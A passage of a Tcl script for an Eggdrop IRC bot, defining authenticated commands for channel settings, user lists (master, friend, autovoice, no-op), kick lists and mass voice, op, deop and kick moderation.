  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc 4!BLoCkEd!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER can ADD Channel" ; return 0 }
  if {$chantarget == ""} { puthlp "NOTICE $nick :$notc Usage: +chan <#chan>" ; return 0 }
  if {[string first # $chantarget]!=0} { set chantarget "#$chantarget" }
  if {[validchan $chantarget]} { puthlp "NOTICE $nick :$notc $chantarget is already on channels list." ; return 0 }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :$notc OnLY ReAL OwNeR can ADD ChaNneL ..!" ; return 0 }
  set joinme $nick ; channel add $chantarget
  if {$opt != "" && [string tolower $opt] == "+nopart"} { catch { channel set $chantarget -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 3:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 } 
  } else { catch { channel set $chantarget -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 } }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chantarget :[lindex $rest 1]" } ; return 0
}
## status publish
bind pub n `+status pub_+status
bind msg n `+status pub_+status
proc pub_+status {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } } ; if {![validchan $chan]} { return 0 }
  if {[string match "*+shared*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc STaTUS $chan \[9ON\]" ; return 0 }
  catch { channel set $chan +shared } ; puthlp "NOTICE $nick :$notc STaTuS $chan \[9ON\]" ; savechan
}
bind pub n `-status pub_-status
bind msg n `-status pub_-status
proc pub_-status {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } } ; if {![validchan $chan]} { return 0 }
  if {[string match "*-shared*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc STaTuS $chan IS \[4OFF\]" ; return 0 }
  catch { channel set $chan -shared } ; puthlp "NOTICE $nick :$notc STaTuS $chan \[4OFF\]" ; savechan ; return 0
}
## enforceban
bind msg Z +enforceban pub_+enforceban
bind pub Z `+enforceban pub_+enforceban
proc pub_+enforceban {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag +E
  puthlp "NOTICE $nick :$notc enforceban $chan \[9ON\]" ; saveuser
}
bind msg Z -enforceban pub_-enforceban
bind pub Z `-enforceban pub_-enforceban
proc pub_-enforceban {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } ; set cflag "c$chan" ; set cflag [string range $cflag 0 8] 
  chattr $cflag -E ; puthlp "NOTICE $nick :$notc enforceban $chan \[4OFF\]" ; saveuser
}
## autovoice
bind pub n `+autovoice pub_+autovoice
proc pub_+autovoice {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } ; set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +AuTovoIcE <secs>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  chattr $cflag +V ; setuser $cflag XTRA "VC" $rest
  puthlp "NOTICE $nick :$notc AuTovoIcE $chan qUeUe \[9$rest\] 2nd"
  saveuser ; pub_mvoice $nick $uhost $hand $chan ""
}
bind pub n `-autovoice pub_-autovoice
proc pub_-autovoice {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag -V ; setuser $cflag XTRA "VC" ""
  puthlp "NOTICE $nick :$notc AuTovoIcE $chan \[4OFF\]" ; saveuser
  foreach x [utimers] { if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] } }
}
## seen
bind pub n `+seen pub_+seen
proc pub_+seen {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {![string match "*seen*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} { foreach x [channels] { catch { channel set $x +seen } } ; savechan ; puthlp "NOTICE $nick :$notc ALL SEEN cHaNNeL \[9ON\]" ; seen ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+seen*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc SEEN $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan +seen } ; puthlp "NOTICE $nick :$notc SEEN $chan \[9ON\]" ; savechan ; seen
}
bind pub n `-seen pub_-seen
proc pub_-seen {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {![string match "*seen*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} { foreach x [channels] { catch { channel set $x -seen } } ; savechan ; puthlp "NOTICE $nick :$notc ALL SEEN cHaNNeL \[4OFF\]" ; seen ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-seen*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc SEEN $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -seen } ; puthlp "NOTICE $nick :$notc SEEN $chan \[4OFF\]" ; savechan ; seen ; return 0
}
## guard
bind pub n `+guard pub_+guard
proc pub_+guard {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} {
    foreach x [channels] {
      catch { channel set $x +echox +trojan +greet flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hp+AJSPTRUED"
      setuser $cflag XTRA "JP" 5
      setuser $cflag XTRA "CHAR" 250
      setuser $cflag XTRA "RPT" 2
      setuser $cflag XTRA "CAPS" 80
    }
    savechan ; puthlp "NOTICE $nick :$notc ALL GuaRd CHaNNeL \[9ON\]" ; return 0
  }
  if {![validchan $chan]} { return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hp+AJSPTRUED"
  setuser $cflag XTRA "JP" 5
  setuser $cflag XTRA "CHAR" 250
  setuser $cflag XTRA "RPT" 2
  setuser $cflag XTRA "CAPS" 80
  if {[string match "*+greet*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc GuARd $chan \[9ON\]" ; return 0 }  
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  catch { channel set $chan +echox +trojan +greet flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 3:6 flood-ctcp 2:10 flood-nick 3:30 }
  puthlp "NOTICE $nick :$notc GuARD $chan \[9ON\]" ; savechan
}
bind pub n `-guard pub_-guard
proc pub_-guard {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} {
    foreach x [channels] {
      catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
      set cflag "c$x" ; set cflag [string range $cflag 0 8] ; chattr $cflag "-hpJSPTRUED"
    }
    savechan ; puthlp "NOTICE $nick :$notc ALL GuaRd cHaN \[4OFF\]" ; return 0
  }
  if {![validchan $chan]} { return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hpJSPTRUED"
  if {[string match "*-greet*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc GuARD $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
  puthlp "NOTICE $nick :$notc GuARD $chan \[4OFF\]" ; savechan ; return 0
}
## +/-master
bind pub n `+master pub_+master
proc pub_+master {nick uhost hand channel param} {
  global botnick alw notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +master <nick>" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 !BLoCkEd!" ; return 0 }
  if {[string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc Add \[$rest\] MasTeR LIsT." ; return 0 }
  if {[matchattr $rest n]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, $rest is ADmIN level." ; return 0 }
  if {[matchattr $rest m]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, $rest is already exist." ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask }
  chattr $rest "fmo"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
    deluser $rest ; return 0
    } else {
    saveuser
    puthlp "NOTICE $nick :$notc Add \[$rest\] MasTeR List." ; puthlp "NOTICE $rest :$notc $nick Add YoU To MasTeR LIsT"
    puthlp "NOTICE $rest :$notc /msg $botnick pass <password>" ; return 0
} }
bind pub n `-master pub_-master
proc pub_-master {nick uhost hand channel param} {
  global notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -master <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, <n/a>" ; return 0 }
  if {[matchattr $rest n] && ![matchattr $nick Z]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, $rest Is ADmIN FLaG" ; return 0 }
  deluser $rest ; saveuser
  puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM MasTeR LIsT"
}
## +/-avoice
bind pub n `+avoice pub_+avoice
proc pub_+avoice {nick uhost hand channel param} {
  global alw notc botnick chk_reg
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +avoice <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc ADD \[$rest\] To aVoIcE LIsT" ; return 0 }
  if {[matchattr $rest v]} { puthlp "NOTICE $nick :$notc $rest is already auto voice" ; return 0 }  
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 !BLoCkEd!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" }
  chattr $rest "v"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
    deluser $rest
    } else {
    saveuser
    puthlp "NOTICE $nick :$notc ADD \[$rest\] To aVoIcE LIsT" ; puthlp "NOTICE $rest :$notc $nick ADD YoU To aVoIcE LIsT"
    set chk_reg($rest) $nick ; putsrv "WHOIS $rest"
  }
  return 0
}
bind pub n `-avoice pub_-avoice
proc pub_-avoice {nick uhost hand channel param} {
  global notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -avoice <nick>" ; return 0 }
  if {![matchattr $rest v]} { puthlp "NOTICE $nick :$notc $rest is not auto voice" ; return 0 }  
  if {![validuser $rest] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, <n/a>" ; return 0 }  
  chattr $rest "-v" ; saveuser ; puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM aVoIcE LIsT" ; return 0
}
## +/- friend
bind pub n `+friend pub_+friend
proc pub_+friend {nick uhost hand channel param} {
  global notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +friend <nick>" ; return 0 }
  if {[validuser $rest] && [string tolower $rest] != [string tolower $alw]} { puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]" ; return 0 }  
  set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" ; chattr $rest "f"
  if {![validuser $rest]} { puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest ; return 0 }
  saveuser
  puthlp "NOTICE $nick :$notc ADD \[$rest\] To FrIeNd LIsT" ; puthlp "NOTICE $rest :$notc $nick ADD YoU To FrIeNd LIsT"
  return 0
}
bind pub n `-friend pub_-friend
proc pub_-friend {nick uhost hand channel param} {
  global alw notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -friend <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, <n/a>" ; return 0 }  
  if {![matchattr $rest f] && ![matchattr $rest m]} { puthlp "NOTICE $nick :$notc $rest isn't on FrIeNd list Flags: [chattr $rest]" ; return 0 }  
  deluser $rest ; saveuser
  puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM FrIeNd LIsT"
}
## +/- ipguard
bind msg n +ipguard pub_+ipguard
bind pub n `+ipguard pub_+ipguard
proc pub_+ipguard {nick uhost hand channel param} {
  global botname botnick notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +ipguard <hostname>" ; return 0 }
  if {$rest == "*" || $rest == "*!*@*"} { puthlp "NOTICE $nick :$notc invalid hostname..!" ; return 0 }
  if {![string match "*@*" $rest]} { puthlp "NOTICE $nick :$notc Usage: +ipguard <hostname>" ; return 0 }
  set ipguard [getuser "config" XTRA "IPG"]
  foreach y $ipguard { if {$y == $rest} { puthlp "NOTICE $nick :$notc $rest allready added..!" ; return 0 } }
  puthlp "NOTICE $nick :$notc add \[$rest\] To IpguaRd"
  lappend ipguard $rest ; setuser "config" XTRA "IPG" $ipguard
  saveuser ; return 0
}
bind msg n -ipguard pub_-ipguard
bind pub n `-ipguard pub_-ipguard
proc pub_-ipguard {nick uhost hand channel param} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -ipguard <hostname>" ; return 0 }
  set ipguard [getuser "config" XTRA "IPG"]
  set nipg "" ; set ok "F"
  foreach y $ipguard { if {$y == $rest} { set ok "T" ; puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM IpguaRd" } { lappend nipg } }
  if {$ok == "T"} { setuser "config" XTRA "IPG" $nipg ; saveuser ; return 0 }
  puthlp "NOTICE $nick :$notc $rest not founded..!"
}
## +/- akick
bind pub n `+akick pub_+akick
proc pub_+akick {nick uhost hand channel param} {
  global botname botnick notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +akick <hostname>" ; return 0 }
  if {$rest == "*" || $rest == "*!*@*"} { puthlp "NOTICE $nick :$notc invalid hostname..!" ; return 0 }
  if {$rest == $botnick} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[validuser $rest]} { puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]" ; return 0 }  
  if {![string match "*@*" $rest]} { set rest "$rest!*@*" }
  if {[string match $rest $botname]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[finduser $rest] != "*"} {
    if {[finduser $rest] != "AKICK"} { puthlp "NOTICE $nick :$notc That Host Belongs To [finduser $rest]" }
    puthlp "NOTICE $nick :$notc That Host already in [finduser $rest]" ; return 0
  }
  puthlp "NOTICE $nick :$notc ADD \[$rest\] To KIcKLIsT..!"
  setuser "AKICK" HOSTS $rest
  saveuser
  foreach x [channels] { if {[isop $botnick $x]} { foreach c [chanlist $x K] { if {![matchattr $c f]} { akick_chk $c [getchanhost $c $x] $x } } } }
  return 0
}
bind pub n `-akick pub_-akick
proc pub_-akick {nick uhost hand channel param} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -akick <hostname>" ; return 0 }
  if {![string match "*@*" $rest]} { set rest "$rest!*@*" }
  set completed 0
  foreach * [getuser "AKICK" HOSTS] { if {${rest} == ${*}} { delhost "AKICK" $rest ; set completed 1 } }
  if {$completed == 0} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  saveuser ; puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM KIcKLIsT"
}
## +/- buntu
bind pub n `+dead pub_+dead
proc pub_+dead {nick uhost hand channel param} {
  global botname botnick notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +dead <hostname>" ; return 0 }
  if {$rest == "*" || $rest == "*!*@*"} { puthlp "NOTICE $nick :$notc invalid hostname..!" ; return 0 }
  if {$rest == $botnick} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[validuser $rest]} { puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]" ; return 0 }  
  if {![string match "*@*" $rest]} { set rest "$rest!*@*" }
  if {[string match $rest $botname]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[finduser $rest] != "*"} {
    if {[finduser $rest] != "DEAD"} { puthlp "NOTICE $nick :$notc That Host Belongs To [finduser $rest]" }
    puthlp "NOTICE $nick :$notc That Host already in [finduser $rest]" ; return 0
  }
  puthlp "NOTICE $nick :$notc ADD \[$rest\] To DeaDLIsT..!"
  setuser "DEAD" HOSTS $rest
  saveuser
  foreach x [channels] { if {[isop $botnick $x]} { foreach c [chanlist $x D] { if {![matchattr $c f]} { dead_chk $c [getchanhost $c $x] $x } } } }
  return 0
}
bind pub n `-dead pub_-dead
proc pub_-dead {nick uhost hand channel param} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -dead <hostname>" ; return 0 }
  if {![string match "*@*" $rest]} { set rest "$rest!*@*" }
  set completed 0
  foreach * [getuser "DEAD" HOSTS] { if {${rest} == ${*}} { delhost "DEAD" $rest ; set completed 1 } }
  if {$completed == 0} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  saveuser ; puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM DeaDLIsT"
}
## +/- noop
bind pub m `+noop pub_+noop
proc pub_+noop {nick uhost hand channel param} {
  global alw notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +noop <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc ADD \[$rest\] To NoOp LIsT" ; return 0 }
  if {[validuser $rest]} { puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]" ; return 0 }  
  set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" ; chattr $rest "O"
  if {![validuser $rest]} { puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest
  } else { saveuser ; puthlp "NOTICE $nick :$notc ADD \[$rest\] To NoOp LIsT" }
  foreach x [channels] { if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -ko 14n4o@p.14l4ist $rest" } { putserv "mode $x -o $rest" } } }
  return 0
}
bind pub m `-noop pub_-noop
proc pub_-noop {nick uhost hand channel param} {
  global alw notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -noop <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc4 !DeNiEd!, <n/a>" ; return 0 }  
  if {![matchattr $rest O]} { puthlp "NOTICE $nick :$notc $rest isn't on no-op list Flags: [chattr $rest]" ; return 0 }  
  deluser $rest ; saveuser ; puthlp "NOTICE $nick :$notc DeL \[$rest\] No@p LIsT"
}
## +/- cycle
bind pub n `+cycle pub_+cycle
proc pub_+cycle {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +cYcLe <minutes>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  chattr $cflag +C
  setuser $cflag XTRA "CYCLE" $rest
  puthlp "NOTICE $nick :$notc cYcLe $chan \[9$rest\] MnT"
  if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
  saveuser
}
bind pub n `-cycle pub_-cycle
proc pub_-cycle {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -C
  setuser $cflag XTRA "CYCLE" ""
  puthlp "NOTICE $nick :$notc cYcLe $chan \[4OFF\]"
  saveuser
  foreach x [timers] { if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] } }
}
## kickcounter 
bind pub n `+kickcounter pub_+kickcounter
proc pub_+kickcounter {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set kcounter "T"
  setuser "config" XTRA "KCOUNTER" "ON"
  puthlp "NOTICE $nick :$notc KIcK COuNTeR \[9ON\]"
  saveuser
}
bind pub n `-kickcounter pub_-kickcounter
proc pub_-kickcounter {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  catch { unset kcounter }
  setuser "config" XTRA "KCOUNTER" "OFF"
  puthlp "NOTICE $nick :$notc KIcK COuNTeR \[4OFF\]"
  saveuser
} 
## mvoice
bind pub n `mvoice pub_mvoice
proc pub_mvoice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] { if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} { if {$i == 6} { voiceq $chan $nicks ; set nicks "" ; append nicks " $x" ; set i 1 } { append nicks " $x" ; incr i } } }
  voiceq $chan $nicks
}
## mdevoice
bind pub n `mdevoice pub_mdevoice
proc pub_mdevoice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] { if {[isvoice $x $chan]} { if {$i == 6} { putserv "MODE $chan -vvvvvv $nicks" ; set nicks "" ; append nicks " $x" ; set i 1 } { append nicks " $x" ; incr i } } }
  putserv "MODE $chan -vvvvvv $nicks"
}
##mop
bind pub n `mop pub_mop
proc pub_mop {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] { if {![isop $x $chan]} { if {$i == 6} { opq $chan $nicks ; set nicks "" ; append nicks " $x" ; set i 1 } { append nicks " $x" ; incr i } } }
  opq $chan $nicks
}
## mdeop
bind pub n `mdeop pub_mdeop
proc pub_mdeop {nick uhost hand chan rest} {
  global botnick notc 
  if {![isop $botnick $chan]} { return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {$nick != "*"} {  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] {
    if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
      if {$i == 5} {
        if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -kooooo 14a4dmin.14r4equest $nicks" } { putserv "MODE $chan -oooooo $nicks" }
        set nicks "" ; append nicks " $x" ; set i 1
      } { append nicks " $x" ; incr i }
  } }
  putserv "MODE $chan -oooooo $nicks"
}
## mkick
bind pub n `mkick pub_mkick
proc pub_mkick {nick uhost hand chan rest} {
  global botnick notc 
  if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    set reason [lrange $rest 1 end]
    if {[string first # $chan]!=0} { set chan "#$chan" }
  } else { set reason $rest }
  if {$reason == ""} { set reason "14admin 4masskick14 request" }
  foreach x [chanlist $chan] { if {(![matchattr $x f]) && ($x != $botnick)} { putsrv "KICK $chan $x :[lgrnd] $reason [banmsg]" } }
}
## topic
bind pub n `topic pub_topic
proc pub_topic {nick uhost hand channel rest} {
  global botnick notc botnick 
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: topic <topic>" ; return 0 }
  putsrv "TOPIC $channel :$rest"
} 
bind msg Z topic msg_topic
proc msg_topic {nick uhost hand rest} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: topic <#> <topic>" ; return 0 }
  set channel [lindex $rest 0]
  if {[string first # $rest] != 0} { set channel "#$channel" }
  if {![validchan $channel]} { puthlp "NOTICE $nick :$notc NoT IN $channel" ; return 0 }
  if {![isop $botnick $channel]} { puthlp "NOTICE $nick :$notc NoT OP $channel" ; return 0 }
  set rest [lrange $rest 1 end]
  putsrv "TOPIC $channel :$rest"
}
## status
bind pub n `status pub_status
proc pub_status {nick uhost hand channel rest} {
  global ban-time botnick nwo alw vern notc
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {$rest != ""} { if {[validchan $rest]} { set channel $rest } { return 0 } }
  set cinfo [channel info $channel]
